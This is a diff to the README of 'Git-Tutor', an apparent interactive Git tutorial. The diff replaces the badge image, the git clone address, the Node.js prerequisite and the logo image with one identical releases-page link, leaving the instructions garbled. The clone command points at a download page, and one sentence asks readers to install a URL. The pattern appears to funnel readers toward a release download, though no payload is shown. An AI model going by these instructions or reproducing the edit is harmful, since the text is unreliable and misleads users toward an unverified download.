@@ -1,6 +1,6 @@
 # Git-Tutor: Learn Git Interactively with Docker 🧠
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-blue)](https://github.com/mtain04/Git-Tutor/releases)
+[![Download Latest Release](https://github.com/mtain04/Git-Tutor/releases%20Latest%20Release-v1.0.0-blue)](https://github.com/mtain04/Git-Tutor/releases)
 
 ## Table of Contents
 - [Overview](#overview)
@@ -29,12 +29,12 @@ To install Git-Tutor, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/mtain04/Git-Tutor.git
+   git clone https://github.com/mtain04/Git-Tutor/releases
    cd Git-Tutor
    ```
 
 2. **Install Dependencies**:
-   Make sure you have Node.js and Docker installed on your machine. Then run:
+   Make sure you have https://github.com/mtain04/Git-Tutor/releases and Docker installed on your machine. Then run:
    ```bash
    npm install
    ```
@@ -119,7 +119,7 @@ If you encounter any issues or have questions, feel free to open an issue in the
 
 For further updates and releases, visit the [Releases section](https://github.com/mtain04/Git-Tutor/releases). 
 
-![Git Logo](https://upload.wikimedia.org/wikipedia/commons/e/e0/Git-logo.svg)
+![Git Logo](https://github.com/mtain04/Git-Tutor/releases)
 
 ---
 
